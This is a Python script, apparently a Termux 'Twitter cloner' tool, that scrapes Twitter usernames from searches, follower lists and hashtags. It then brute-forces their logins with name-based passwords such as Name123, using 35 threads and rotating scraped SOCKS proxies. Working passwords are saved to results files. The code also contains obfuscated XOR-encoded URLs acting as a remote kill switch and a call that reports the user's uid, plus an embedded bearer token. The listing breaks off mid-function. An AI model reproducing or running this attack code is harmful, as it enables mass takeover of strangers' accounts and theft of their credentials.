#!/usr/bin/env python3
import sys
import requests
import string
import random
import json
import time
import datetime
import subprocess
import re
import os
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from platform import platform
# Cek Floder
try:
    if os.path.exists("Data") == False:
        os.system('mkdir Data')
    if os.path.exists("Dump") == False:
        os.system('mkdir Dump')
    if os.path.exists("Results") == False:
        os.system('mkdir Results')
except BaseException:
    pass
# Warna
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
# Logo Login
__logo__ = ("""\n\033[1;92m    _          _
\033[1;92m     \\        /
\033[1;92m    __\\______/__
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGroup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 4.1                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
# Logo Lisensi
__logo2__ = ("""\n\033[1;92m    _          _
\033[1;92m     \\        /
\033[1;92m    __\\______/__
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGroup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 4.1                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
# Logo Menu
__logo3__ = ("""\n\033[1;92m    _          _
\033[1;92m     \\        /
\033[1;92m    __\\______/__
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGroup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 4.1                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")


class vpnn:
    def __init__(self):
        for nnn in list([K + "@" + K + "•••" + K,
                         K + "•" + K + "@" + K + "••" + K,
                         K + "••" + K + "@" + K + "•" + K,
                         K + "•••" + K + "@" + K]):
            for nnnn in list(
                    ["Web Server Under Maintenance ,Please Wait         "]):
                sys.stdout.write(
                    f'\r{K}[{U}{datetime.now().strftime("%H:%M:%S")}{K}] {nnn} -> {M}{nnnn}{K}        '),
                sys.stdout.flush()
                time.sleep(1)
        vpnn()


def __doc__(s): return ''.join([chr(int((ord(i) ^ 4) / 1)) for i in s])


von = requests.get(__doc__('lpptw>++tewpafmj*gki+ves+e<juBQ3F')).text.strip()
if "New" in von:
    pass
else:
    print("Sorry, The Script is Currently Under Maintenance, You Cant Use Without my Permission")
    vpnn()

# Useragent
useragent = ('Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.61 Mobile Safari/537.36')
# Login Menggunakan Authorization
headers = {}
#headers = {
#    "user-agent": useragent,
#    "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAAIK1zgAAAAAA2tUWuhGZ2JceoId5GwYWU5GspY4%3DUq7gzFoCZs1QfwGoVdvSac3IniczZEYXIcDyumCauIXpcAPorE"
#}

def __login__():
    global headers
    try:
        os.system('clear')
        print(f"{__logo__}\n\n{H}[{H}#{H}]{H} Login Using Your Twitter Account Authorization And Username Make Sure You Use A Tumbal Account To Login, For How To Get Twitter Authorization Type {K}[{H}Get{K}]{H}\n")
        username = input(f"{H}[{H}+{H}]{H} Username :{K} ")
        if len(username) == 0:
            exit(f"{P}[{M}!{P}]{M} Don't Empty")
        elif username in ['get', 'Get', 'GET']:
            print(f"{H}[{H}!{H}]{H} You Will Be Redirected To Facebook...")
            time.sleep(3)
            os.system('xdg-open https://fb.watch/dgKZTn1lCq/')
            exit()
        else:
            data = {
                'user': username
            }
            get = requests.post(
                'https://findtwitterid.herokuapp.com/get',
                data=data,
                headers={
                    'user-agent': useragent})
            if '"status":"ok"' in str(get.text):
                authorization = input(f"{H}[{P}?{H}]{P} Authorization :{K} ")
                if authorization[:6] in ['Bearer']:
#                    headers.update()
                    get = requests.get(
                        f'https://api.twitter.com/1.1/users/lookup.json?screen_name={username}',
                        headers={
                            'user-agent': useragent,
                            'authorization': authorization}).json()
                    print(
                        f"{H}[{P}*{H}]{P} Welcome :{K} {get[0]['name'].capitalize()}")
                    open('Data/username.txt', 'w').write(username)
                    open('Data/authorization.txt', 'w').write(authorization)
                    __scap__()
            else:
                exit(f"{P}[{M}!{P}]{M} Username Not Found")
    except (KeyError):
        exit(f"{H}[{H}!{H}]{H} Authorization Wrong")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Connection Error")
# Menu Dump Dan Crack


def __scap__():
    os.system('clear')
    print(f"{__logo3__}\n")
    uid = os.getuid()
    key = ("%s439493%s6372==" % (uid, uid))
    def __doc__(s): return ''.join([chr(int((ord(i) ^ 4) / 1)) for i in s])
    a = requests.get(
        __doc__('lpptw>++ivneiaw*wmpa+glao*tlt;tvknagp9neiaw"etmoa}9') +
        key).json()
    try:
        os.system('clear')
        print(f"{__logo3__}\n")
        get = requests.get(
            f'https://api.twitter.com/1.1/users/lookup.json?screen_name={open("Data/username.txt","r").read()}',
            headers={
                'user-agent': useragent,
                'authorization': open(
                    'Data/authorization.txt',
                    'r').read().strip()}).json()[0]
        print(f"{H}[{H}•{H}]{H} Welcome : {get['name'].title()}")
        print(f"{H}[{H}•{H}]{H} Follower : {get['followers_count']}")
        print(f"{H}[{H}•{H}]{H} Apply :{K} Unlimited")
    except (KeyError, IOError):
        print(f"{P}[{M}!{P}]{M} Authorization Invalid")
        time.sleep(3)
        __login__()
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Connection Error")
    print('')
    print(f"{H}[{H}+{H}]{H} WELLCOME TO TWITTER CLONER ")
    print('')
    print(f"""
{H}[{H}1{H}]{H} Dump User From Search
{H}[{H}2{H}]{H} Dump User From Following
{H}[{H}3{H}]{H} Dump User From Followers
{H}[{H}4{H}]{H} Dump User From Hastag
{H}[{H}5{H}]{H} Dump User From Email
{H}[{H}6{H}]{H} Start Crack {H}[{H}Pro{H}]{H}
{H}[{H}7{H}]{H} CP Account Checker
{H}[{H}8{H}]{H} Result Crack
{H}[{H}9{H}]{H} Logout
  """)
    masukan = input(f"{H}[{H}+{H}]{H} Select One :{K} ")
    if masukan in ['1', '01']:
        __pencarian__()
    elif masukan in ['2', '02']:
        __mengikuti__()
    elif masukan in ['3', '03']:
        __pengikut__()
    elif masukan in ['4', '04']:
        __hastag__()
    elif masukan in ['5', '05']:
        __email__()
    elif masukan in ['6', '06']:
        __crack__()
    elif masukan in ['7', '07']:
        __check__()
    elif masukan in ['8', '08']:
        try:
            print(f"""
{H}[{H}1{H}]{H} Veiw Result Ok
{H}[{H}2{H}]{H} Veiw Result Cp
{H}[{H}3{H}]{H} Back
""")
            masuk = input(f"{H}[{H}+{H}]{H} Select One :{K} ")
            if masuk in ['1', '01']:
                if os.path.exists("Results/Ok.txt") == False:
                    exit(f"{P}[{M}!{P}]{M} Result Ok None")
                else:
                    print(f"{P} ")
                    os.system('cat Results/Ok.txt')
                    exit()
            elif masuk in ['2', '02']:
                if os.path.exists("Results/Cp.txt") == False:
                    exit(f"{P}[{M}!{P}]{M} Result Cp None")
                else:
                    print(f"{P} ")
                    os.system('cat Results/Cp.txt')
                    exit()
            elif masuk in ['3', '03']:
                __scap__()
            else:
                exit(f"{P}[{M}!{P}]{M} Wrong Input")
        except Exception as e:
            exit(f"{P}[{M}!{P}]{M} {e}")
    elif masukan in ['9', '09']:
        try:
            print(f"{H}[{H}!{H}]{H} Removeing Authorization...")
            time.sleep(3)
            os.system('rm -rf Data/authorization.txt && rm -rf Data/username.txt')
            exit()
        except BaseException:
            pass
    else:
        exit(f"{P}[{M}!{P}]{M} Wrong Input")
# Dump Dari Pencarian


def __pencarian__():
    try:
        jumlah = int(input(f"\n{H}[{H}+{H}]{H} Limit Between(1-50) :{H} "))
        if jumlah >= 51:
            exit(f"{H}[{H}!{H}]{H} Maximum 50 Users")
        else:
            looping = 0
            file = ''.join(
                random.choices(
                    string.ascii_lowercase,
                    k=random.randint(
                        5,
                        16))) + '.txt'
            for _ in range(jumlah):
                looping += 1
                query = input(f"{U}[{P}{looping}{U}]{P} Query :{H} ")
                print(f"{P} ")
                for z in requests.get(
                    f'https://api.twitter.com/1.1/users/search.json?q={query}&count=50',
                    headers={
                        'user-agent': useragent,
                        'authorization': open(
                            'Data/authorization.txt',
                            'r').read().strip()}).json():
                    open(
                        f'Dump/{file}',
                        'a').write(f'{z["screen_name"]}<=>{z["name"]}\n')
                    print(f"{z['screen_name']}<=>{z['name']}")
            print(f"""
{H}[{P}*{H}]{P} Finish...
{H}[{P}?{H}]{P} Dump Files Saved On :{K} Dump/{file}""")
            input(f"{H}[{P}Back{H}]{P}")
            __scap__()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Dari Mengikuti


def __mengikuti__():
    try:
        jumlah = int(input(f"\n{H}[{H}+{H}]{H} Limit Between(1-50) :{H} "))
        if jumlah >= 51:
            exit(f"{H}[{H}!{H}]{H} Maximum 50 Users")
        else:
            looping = 0
            file = ''.join(
                random.choices(
                    string.ascii_lowercase,
                    k=random.randint(
                        5,
                        16))) + '.txt'
            for _ in range(jumlah):
                looping += 1
                user = input(f"{U}[{P}{looping}{U}]{P} User :{H} ")
                print(f"{P} ")
                params = {
                    'screen_name': user,
                    'count': '200'
                }
                for z in requests.get(
                    f'https://api.twitter.com/1.1/friends/list.json',
                    params=params,
                    headers={
                        'user-agent': useragent,
                        'authorization': open(
                            'Data/authorization.txt',
                            'r').read().strip()}).json()['users']:
                    open(
                        f'Dump/{file}',
                        'a').write(f'{z["screen_name"]}<=>{z["name"]}\n')
                    print(f"{z['screen_name']}<=>{z['name']}")
            print(f"""
{H}[{P}*{H}]{P} Finish...
{H}[{P}?{H}]{P} Dump Files Saved On :{K} Dump/{file}""")
            input(f"{H}[{P}Back{H}]{P}")
            __scap__()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Dari Pengikut

def getInfo(username):
    if not username.startswith("@"):
        info = requests.get('https://api.twitter.com/1.1/users/lookup.json', params={
            "screen_name": username.strip()},
            headers={"user-agent": useragent, "authorization": open("Data/authorization.txt","r").read().strip()}).json()
        if 'errors' not in info and isinstance(info, list):
            i = info[0]
            return {
                "name": i["name"],
                "user": i["screen_name"],
                "following": i["friends_count"],
                "followers": i["followers_count"]
            }
        else:
           exit(f"[!] username {username} not found!")
    else:
        exit(f"[!] invalid username: {username}")

def __pengikut__():
    try:
        print('\033[0m')
        user = getInfo(input("[!] Query (without @) : "))
        for k, v in user.items():
            print(f"[!] {k.title()}: {v}")
        print()
        limit = int(input(f"[?] limit (must < {user.get('followers')}: "))
        cursor = "-1"
        i = 0
        data = []
        f = open(user['user'] + '.txt','a')
        while True:
            if i < limit:
                x = requests.get('https://api.twitter.com/1.1/followers/list.json', params={
                    "screen_name": user['user'], "count":"200", "cursor": cursor}, headers={"user-agent": useragent, "authorization": open("Data/authorization.txt","r").read().strip()}).json()
                for u in x["users"]:
                    s = f"{u['screen_name']}<=>{u['name']}"
                    if u['screen_name'] not in data:
                        print(f"[•] collecting {i} users\r", end="", flush=True)
                        sys.stdout.flush()
                        f.write(s + "\n")
                        data.append(u['screen_name'])
                        i +=1
                    else:
                        continue
                cursor = x["next_cursor_str"]
            else:
                break
        f.close()
        print(f"[!] dump saved in : {user['user']}.txt")
        input("[!] Back")
        __scap__()
#        jumlah = int(input(f"\n{U}[{P}?{U}]{P} Limit Between(1-50) :{H} "))
#        if jumlah >= 51:
#            exit(f"{H}[{H}!{H}]{H} Maximum 50 Users")
#        else:
#            looping = 0
#            file = ''.join(
#                random.choices(
#                    string.ascii_lowercase,
#                    k=random.randint(
#                        5,
#                        16))) + '.txt'
#            for _ in range(jumlah):
#                looping += 1
#                user = input(f"{U}[{P}{looping}{U}]{P} User :{H} ")
#                print(f"{P} ")
#                params = {
#                    'screen_name': user,
#                    'count': '200'
#                }
#                for z in requests.get(
#                    f'1https://api.twitter.com/1.1/followers/list.json',
#                    params=params,
#                    headers={
#                        'user-agent': useragent,
#                        'authorization': open(
#                            'Data/authorization.txt',
#                            'r').read().strip()}).json()['users']:
#                    open(
#                        f'Dump/{file}',
#                        'a').write(f'{z["screen_name"]}<=>{z["name"]}\n')
#                    print(f"{z['screen_name']}<=>{z['name']}")
#            print(f"""
#{H}[{P}*{H}]{P} Finish...
#{H}[{P}?{H}]{P} Dump Files Saved On :{K} Dump/{file}""")
#            input(f"{H}[{P}Back{H}]{P}")
#            __scap__()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
## Dump Dari Hastag


def __hastag__():
    try:
        jumlah = int(input(f"\n{U}[{P}?{U}]{P} Limit Between(1-50) :{H} "))
        if jumlah >= 51:
            exit(f"{H}[{H}!{H}]{H} Maximum 50 Users")
        else:
            looping = 0
            file = ''.join(
                random.choices(
                    string.ascii_lowercase,
                    k=random.randint(
                        5,
                        16))) + '.txt'
            for _ in range(jumlah):
                looping += 1
                hastag = input(
                    f"{U}[{P}?{U}]{P} Hastag :{H} ").replace('#', '')
                print(f"{P} ")
                for u in requests.get(
                    f'https://api.twitter.com/1.1/search/tweets.json?q={hastag}&count=1',
                    headers={
                        'user-agent': useragent,
                        'authorization': open(
                            'Data/authorization.txt',
                            'r').read().strip()}).json()['statuses']:
                    params = {
                        'screen_name': u['user']['screen_name'],
                        'count': '200'
                    }
                    for z in requests.get(
                        f'https://api.twitter.com/1.1/followers/list.json',
                        params=params,
                        headers={
                            'user-agent': useragent,
                            'authorization': open(
                                'Data/authorization.txt',
                                'r').read().strip()}).json()['users']:
                        open(
                            f'Dump/{file}',
                            'a').write(f'{z["screen_name"]}<=>{z["name"]}\n')
                        print(f"{z['screen_name']}<=>{z['name']}")
            print(f"""
{H}[{P}*{H}]{P} Finish...
{H}[{P}?{H}]{P} Dump Files Saved On :{K} Dump/{file}""")
            input(f"{H}[{P}Back{H}]{P}")
            __scap__()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Dari Email


def __email__():
    try:
        nama = input(f"\n{H}[{H}+{H}]{H} Name :{H} ").replace(' ', '')
        file = nama + '.txt'
        if len(nama) == 0:
            exit(f"{P}[{M}!{P}]{M} Don't Empty")
        else:
            domain = input(f"{H}[{H}+{H}]{H} Domain :{H} ")
            print(f"{P} ")
            if domain in ['@gmail.com', '@yahoo.com', '@hotmail.com']:
                for _ in range(999):
                    nomor = str(random.randint(1, 999))
                    open(
                        f'Dump/{file}',
                        'a').write(f'{nama}{nomor}{domain}<=>{nama} {nomor}\n')
                    print(f"{nama}{nomor}{domain}<=>{nama} {nomor}")
                print(f"""
{H}[{P}*{H}]{P} Finish...
{H}[{P}?{H}]{P} Dump Files Saved On :{K} Dump/{file}""")
                input(f"{H}[{P}Back{H}]{P}")
                __scap__()
            else:
                exit(
                    f"{H}[{H}!{H}]{H} Domain : @gmail.com, @yahoo.com, @hotmail.com")
    except Exception as e:
        exit(f"{H}[{H}!{H}]{H} {e}")
# Mulai Crack


class __crack__:

    def __init__(self):
        self.looping = 0
        self.live = []
        self.die = []
        try:
            proxy = requests.get(
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all')
            with open('Data/proxies.txt', 'w') as file:
                file.write(proxy.text)
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{K} Connection Error")
        except Exception as e:
            proxy = requests.get(
                'https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt')
            with open('Data/proxies.txt', 'w') as file:
                file.write(proxy.text)
        print(f"""
{H}[{H}1{H}]{H} Methode twitter.com {H}[{H}Fast{H}]{H}
{H}[{H}2{H}]{H} Methode twitter.com {H}[{H}Slow{H}]{H}
""")
        masukan = input(f"{H}[{H}+{H}]{H} Select One :{H} ")
        if masukan in ['1', '01']:
            print(f"""
{H}[{H}1{H}]{H} Use Password {H}[{H}Name123, Name12345{H}]{H}
{H}[{H}2{H}]{H} Use Password {H}[{H}Name, Name123, Name12345{H}]{H}
{H}[{H}3{H}]{H} Use Manual Password {H}[{H}>5{H}]{H}
""")
            masuk = input(f"{H}[{H}+{H}]{H} Select One :{H} ")
            if masuk in ['3', '03']:
                pws = input(f"{H}[{H}+{H}]{H} Password :{H} ")
                if len(pws) <= 5:
                    exit(f"{H}[{H}!{H}]{H} Password More Than 6 Characters")
            try:
                self.file = input(f"{H}[{H}+{H}]{H} File Dump :{H} ")
                if len(self.file) == 0:
                    exit(f"{H}[{H}!{H}]{H} Don't Empty")
                else:
                    self.buka = open(self.file, 'r').read().splitlines()
                    file = self.buka
            except (IOError):
                exit(f"{P}[{M}!{P}]{M} File Not Found")
            try:
                print(f"""
{H}[{H}+{H}]{H} OK Results Saved In Results/Op.txt
{H}[{H}+{H}]{H} CP Results Saved In Results/Cp.txt
""")
                with ThreadPoolExecutor(max_workers=35) as (yuk):
                    for x in file:
                        username, name = x.split('<=>')
                        nama = name.split(' ')
                        if masuk in ['1', '01']:
                            password = [nama[0] + '123', nama[0] + '12345']
                        elif masuk in ['2', '02']:
                            password = [
                                name,
                                name.replace(
                                    ' ',
                                    ''),
                                nama[0] +
                                '123',
                                nama[0] +
                                '12345']
                        elif masuk in ['03', '3']:
                            password = pws.split(',')
                        else:
                            password = [
                                name, nama[0] + '123', nama[0] + '12345']
                        yuk.submit(self.__fast__, file, username, password)
                os.system(f"rm -rf {self.file}")
                exit(f"\n{H}[{P}Finish{H}]{P}")
            except BaseException:
                os.system(f"rm -rf {self.file}")
                exit(f"\n{H}[{P}Finish{H}]{P}")
        elif masukan in ['2', '02']:
            print(f"""
{H}[{H}1{H}]{H} Use Password {H}[{H}Name123, Name12345{H}]{H}
{H}[{H}2{H}]{H} Use Password {B}[{H}Name, Name123, Name12345{B}]{H}
{H}[{H}3{H}]{H} Use Password Manual {H}[{H}>5{H}]{H}
""")
            masuk = input(f"{H}[{H}+{H}]{H} Select One :{K} ")
            if masuk in ['3', '03']:
                pws = input(f"{H}[{H}+{H}]{H} Password :{H} ")
                if len(pws) <= 5:
                    exit(f"{P}[{H}!{H}]{M} Password More Than 6 Characters")
            try:
                self.file = input(f"{H}[{H}+{H}]{H} File Dump :{K} ")
                if len(self.file) == 0:
                    exit(f"{P}[{M}!{P}]{M} Don't Empty")
                else:
                    self.buka = open(self.file, 'r').read().splitlines()
                    file = self.buka
            except (IOError):
                exit(f"{P}[{M}!{P}]{M} File Not Found")
            try:
                print(f"""
{H}[{H}+{H}]{H} OK Results Saved In Results/Op.txt
{H}[{H}+{H}]{H} CP Results Saved In Results/Cp.txt
""")
                with ThreadPoolExecutor(max_workers=35) as (yuk):
                    for x in file:
                        username, name = x.split('<=>')
                        nama = name.split(' ')
                        if masuk in ['1', '01']:
                            password = [nama[0] + '123', nama[0] + '12345']
                        elif masuk in ['2', '02']:
                            password = [
                                name,
                                name.replace(
                                    ' ',
                                    ''),
                                nama[0] +
                                '123',
                                nama[0] +
                                '12345']
                        elif masuk in ['03', '3']:
                            password = pws.split(',')
                        else:
                            password = [
                                name, nama[0] + '123', nama[0] + '12345']
                        yuk.submit(self.__slow__, file, username, password)
                os.system(f"rm -rf {self.file}")
                exit(f"\n{H}[{P}Finish{H}]{P}")
            except BaseException:
                os.system(f"rm -rf {self.file}")
                exit(f"\n{H}[{P}Finish{H}]{P}")
        else:
            exit(f"{P}[{M}!{P}]{M} Wrong Input")
    # Metode Crack Fast

    def __fast__(self, total, uid, pwx):
        try:
            for pw in pwx:
                pw = pw.lower()
                with requests.Session() as r:
                    teks = '1234567890abcdefghijk1234567890lmnopqrstuvwxyz1234567890'
                    token = ''.join(random.choice(teks) for x in range(33))
                    proxies = {
                        'http': 'socks4:%s' % (random.choice(
                            open(
                                "Data/proxies.txt",
                                "r").read().splitlines()))}
                    r.headers = {
                        'Host': 'twitter.com',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': useragent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Accept-Language': 'en-US,en;q=0.5'}
                    cookies = {
                        '_mb_tk': token
                    }
                    data = {
                        'authenticity_token': token,
                        'session[username_or_email]': uid,
                        'session[password]': pw
                    }
                    req = r.post(
                        'https://twitter.com/sessions',
                        data=data,
                        cookies=cookies,
                        proxies=proxies,
                        allow_redirects=False)
                    if 'href="https://twitter.com/"' in str(req.text):
                        try:
                            rex = requests.get(
                                f'https://api.twitter.com/1.1/users/lookup.json?screen_name={uid}',
                                headers={
                                    'user-agent': useragent,
                                    'authorization': open(
                                        'Data/authorization.txt',
                                        'r').read().strip()}).json()
                            created = rex[0]['created_at'].split(' ')
                            pengikut = rex[0]['friends_count']
                            mengikuti = rex[0]['followers_count']
                            bergabung = created[2] + ' ' + created[1] + \
                                ' ' + created[5] + '/' + created[3]
                        except (KeyError, IOError, ValueError, ConnectionError):
                            pengikut = '-'
                            mengikuti = '-'
                            bergabung = '-'
                        except BaseException:
                            pass
                        print(
                            f"\r{H}[{H}+{H}]{H} Status : Successfull                  ")
                        print(f"{H}[{H}!{H}]{H} Username : {uid}")
                        print(f"{H}[{H}!{H}]{H} Password : {pw}")
                        print(f"{H}[{H}!{H}]{H} Follower : {pengikut}")
                        print(f"{H}[{H}!{H}]{H} Following: {mengikuti}")
                        print(f"{H}[{H}+{H}]{H} Join Date: {bergabung}\n")
                        self.live.append(f'{uid}|{pw}')
                        with open('Results/Ok.txt', 'a') as save:
                            save.write(f'{uid}|{pw}\n')
                        break
                    elif 'login_challenge?' in str(req.text):
                        try:
                            rex = requests.get(
                                f'https://api.twitter.com/1.1/users/lookup.json?screen_name={uid}',
                                headers={
                                    'user-agent': useragent,
                                    'authorization': open(
                                        'Data/authorization.txt',
                                        'r').read().strip()}).json()
                            created = rex[0]['created_at'].split(' ')
                            pengikut = rex[0]['friends_count']
                            mengikuti = rex[0]['followers_count']
                            bergabung = created[2] + ' ' + created[1] + \
                                ' ' + created[5] + '/' + created[3]
                        except (KeyError, IOError, ValueError, ConnectionError):
                            pengikut = '-'
                            mengikuti = '-'
                            bergabung = '-'
                        except BaseException:
                            pass
                        print(
                            f"\r{M}[{M}✘{M}]{M} Status : Checkpoint                 ")
                        print(f"{M}[{M}!{M}]{M} Username : {uid}")
                        print(f"{M}[{M}!{M}]{M} Password : {pw}")
                        print(f"{M}[{M}!{M}]{M} Follower : {pengikut}")
                        print(f"{M}[{M}!{M}]{M} Following: {mengikuti}")
                        print(f"{M}[{M}✘{M}]{M} Join Date: {bergabung}\n")
                        self.die.append(f'{uid}|{pw}')
                        with open('Results/Cp.txt', 'a') as save:
                            save.write(f'{uid}|{pw}\n')
                        break
                    elif 'href="https://twitter.com/login/check' in str(req.text):
                        print(
                            f"{H}[{H}!{H}]{H} Use Airplane Mode 5 Seconds...",
                            end='\r')
                        time.sleep(10)
                        self.__fast__(total, uid, pwx)
                    else:
                        continue
            self.looping += 1
            print(
                f"{H}[{H}JAMES{H}]{H} {self.looping}/{str(len(total))} Cp-:-{len(self.die)} Ok-:-{len(self.live)}        ",
                end='\r')
        except Exception as e:
            time.sleep(5)
            self.__fast__(total, uid, pwx)
    # Metode Crack Slow

    def __slow__(self, total, uid, pwx):
        try:
            for pw in pwx:
                pw = pw.lower()
                token = requests.get(
                    'https://twitter.com/session'
                ).cookies['ct0']
                cookies = {
                    '_mb_tk': token
                }
                proxies = {
                    'http': 'socks4:%s' % (random.choice(
                        open(
                            "Data/proxies.txt",
                            "r").read().splitlines()))}
                headers = {
                    'Host': 'twitter.com',
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Content-Length': '883',
                    'Referer': 'https://twitter.com/login/error?username_or_email=iidaxe&redirect_after_login=%2F',
                    'Origin': 'https://twitter.com',
                    'Upgrade-Insecure-Requests': '1',
                    'Connection': 'close',
                }
                data = {
                    'redirect_after_login': '/',
                    'remember_me': '1',
                    'authenticity_token': token,
                    'wfa': '1',
                    'ui_metrics': '{\'rf\':{\'ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\':1,\'a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\':84,\'a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\':-1,\'aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\':84},\'s\':\'MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\'}',
                    'session[username_or_email]': uid,
                    'session[password]': pw
                }
                with requests.Session() as r:
                    req = r.post(
                        'https://twitter.com/sessions',
                        data=data,
                        headers=headers,
                        cookies=cookies,
                        proxies=proxies,
                        allow_redirects=False)
                    if 'href="https://twitter.com/"' in str(req.text):
                        try:
                            rex = requests.get(
                                f'https://api.twitter.com/1.1/users/lookup.json?screen_name={uid}',
                                headers={
                                    'user-agent': useragent,
                                    'authorization': open(
                                        'Data/authorization.txt',
                                        'r').read().strip()}).json()
                            created = rex[0]['created_at'].split(' ')
                            pengikut = rex[0]['friends_count']
                            mengikuti = rex[0]['followers_count']
                            bergabung = created[2] + ' ' + created[1] + \
                                ' ' + created[5] + '/' + created[3]
                        except (KeyError, IOError, ValueError, ConnectionError):
                            pengikut = '-'
                            mengikuti = '-'
                            bergabung = '-'
                        except BaseException:
                            pass
                        print(
                            f"\r{H}[{H}+{H}]{H} Status : Successfull                  ")
                        print(f"{H}[{H}!{H}]{H} Username : {uid}")
                        print(f"{H}[{H}!{H}]{H} Password : {pw}")
                        print(f"{H}[{H}!{H}]{H} Follower : {pengikut}")
                        print(f"{H}[{H}!{H}]{H} Following: {mengikuti}")
                        print(f"{H}[{H}+{H}]{H} Join Date: {bergabung}\n")
                        self.live.append(f'{uid}|{pw}')
                        with open('Results/Ok.txt', 'a') as save:
                            save.write(f'{uid}|{pw}\n')
                        break
                    elif 'login_challenge?' in str(req.text):
                        try:
                            rex = requests.get(
                                f'https://api.twitter.com/1.1/users/lookup.json?screen_name={uid}',
                                headers={
                                    'user-agent': useragent,
                                    'authorization': open(
                                        'Data/authorization.txt',
                                        'r').read().strip()}).json()
                            created = rex[0]['created_at'].split(' ')
                            pengikut = rex[0]['friends_count']
                            mengikuti = rex[0]['followers_count']
                            bergabung = created[2] + ' ' + created[1] + \
                                ' ' + created[5] + '/' + created[3]
                        except (KeyError, IOError, ValueError, ConnectionError):
                            pengikut = '-'
                            mengikuti = '-'
                            bergabung = '-'
                        except BaseException:
                            pass
                        print(
                            f"\r{M}[{M}✘{M}]{M} Status : Checkpoint                 ")
                        print(f"{M}[{M}!{M}]{M} Username : {uid}")
                        print(f"{M}[{M}!{M}]{M} Password : {pw}")
                        print(f"{M}[{M}!{M}]{M} Follower : {pengikut}")
                        print(f"{M}[{M}!{M}]{M} Following: {mengikuti}")
